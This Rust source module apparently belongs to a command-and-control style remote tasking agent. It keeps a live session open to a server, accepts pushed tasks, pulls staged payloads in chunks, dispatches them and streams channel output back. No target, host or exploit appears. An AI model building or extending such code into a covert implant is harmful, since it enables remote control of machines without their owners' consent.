use prost::Message;

use crate::error::ContactError;
use crate::session::Session;
use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, StagedPull, TaskRequest};

// The held live session, shared by the stream transports (architecture.md
// Sec 8): after the opening handshake exchange the server pushes tasking the
// moment it queues, each message its own frame batch, and the loop parks
// between messages -- blocking while no channel is live, ticking (the
// CHANNEL_TICK cadence) while one could have queued output, so its pumps
// never sit on an unflushed write. A carriage supplies the byte exchange;
// everything here is the session discipline both carriages run.

/// The channel tick while a live channel could have queued output.
pub(crate) const CHANNEL_TICK: std::time::Duration = std::time::Duration::from_millis(200);

/// The byte exchange one carriage supplies: write one batch's sealed body,
/// read the next message (or a tick), and arm or disarm the read tick.
pub(crate) trait LiveChannel {
    fn send_batch(&mut self, session: &mut Session, frames: &[Frame]) -> Result<(), ContactError>;

    /// Ok(Some(frames)) for one decoded message; Ok(None) for an idle tick
    /// (only read with the tick armed).
    fn recv(&mut self, session: &mut Session) -> Result<Option<Vec<Frame>>, ContactError>;

    /// Arm the short read timeout while a channel is live, disarm to park.
    fn arm_tick(&mut self, on: bool);
}

/// The held handshake arc both stream carriages run after their socket opens:
/// write the handshake, answer-refusal short-circuits, results whose delivery
/// may have died with an earlier connection ride first (the server records
/// first-wins), then the held loop takes over the answer's remaining frames.
pub(crate) fn held_handshake(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    inbound: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    flush(channel, session)?;
    serve_held(session, channel, inbound, acks)?;
    serve_loop(session, channel, acks)
}

/// One message's held frames: channel input routes to the live channel it
/// names, a staged task pulls its payload inline (the blocking exchange the
/// held connection permits), tasking is accepted and flushed the moment it
/// happens. Downstream frames discriminate on kind first -- the positional
/// tasking parse is for kindless frames alone.
pub(crate) fn serve_held(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    frames: &[Frame],
    acks: bool,
) -> Result<(), ContactError> {
    for frame in frames {
        if frame.kind() == FrameKind::ChannelInput {
            if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if frame.kind() != FrameKind::Unspecified {
            continue;
        }
        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
            if task.staged_bytes.is_some() {
                run_staged(session, channel, &task)?;
            } else {
                session.accept(&task, acks);
                flush(channel, session)?;
            }
        }
    }
    Ok(())
}

/// The parked half of the session loop: channel output is drained and flushed
/// on every wake, and the park itself blocks while no channel is live
/// (nothing but the server's push can wake us) or ticks while one is.
pub(crate) fn serve_loop(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    acks: bool,
) -> Result<(), ContactError> {
    loop {
        session.drain_channels();
        flush(channel, session)?;
        channel.arm_tick(session.channels.any_live());
        if let Some(frames) = channel.recv(session)? {
            serve_held(session, channel, &frames, acks)?;
        }
    }
}

/// The staged arm on the held connection: demand the payload, then block on
/// the messages until its terminal chunk -- nothing else interleaves on a
/// blocking read.
pub(crate) fn run_staged(
    session: &mut Session,
    channel: &mut dyn LiveChannel,
    task: &TaskRequest,
) -> Result<(), ContactError> {
    let demand = [Frame {
        payload: StagedPull {
            task_id: task.task_id.clone(),
        }
        .encode_to_vec(),
        kind: FrameKind::StagedPull as i32,
    }];
    channel.send_batch(session, &demand)?;

    let mut payload: Vec<u8> = Vec::new();
    loop {
        // An idle tick while the payload parks is a tick, not a close: keep
        // waiting (the stream carriage's own staged arm waited the same way).
        let Some(frames) = channel.recv(session)? else {
            continue;
        };
        for frame in frames {
            if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
                if chunk.task_id == task.task_id {
                    payload.extend_from_slice(&chunk.data);
                    if chunk.terminal {
                        let (outcome, output) = super::http::dispatch_staged(
                            session,
                            &task.verb,
                            &task.arguments,
                            &payload,
                        );
                        session.outbox.result(&task.task_id, outcome, &output);
                        return Ok(());
                    }
                }
            }
        }
    }
}

/// Writes whatever the session has queued since the last write, marking it
/// delivered: a batch that left the socket counts as delivered (the
/// wire-writing carriers' mark-on-write rule).
pub(crate) fn flush(
    channel: &mut dyn LiveChannel,
    session: &mut Session,
) -> Result<(), ContactError> {
    let batch = session.outbox.batch();
    if batch.is_empty() {
        return Ok(());
    }
    channel.send_batch(session, &batch)?;
    session.outbox.batch_crossed(batch.len());
    Ok(())
}
